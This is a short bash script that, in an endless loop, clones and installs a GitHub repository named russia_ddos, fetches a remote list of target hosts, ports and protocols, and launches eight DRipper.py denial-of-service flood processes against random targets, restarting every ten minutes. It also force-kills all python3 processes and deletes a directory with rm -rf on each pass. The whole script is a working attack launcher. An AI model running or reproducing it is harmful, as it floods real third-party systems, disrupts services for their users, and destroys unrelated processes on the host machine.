#!/bin/bash

while true
do
pkill -9 python3
cd ~
rm -rf russia_ddos
git clone https://github.com/alexmon1989/russia_ddos.git
pip install -r russia_ddos/requirements.txt
for i in $(seq 1 8)
do
        site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper | cat | shuf -n 1)
        addr=$(echo $site | awk '{print $1}')
        port=$(echo $site | awk '{print $2}')
        prot=$(echo $site | awk '{print $3}')
        echo $addr $port $prot
        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
done
sleep 600
pkill -9 python3
done
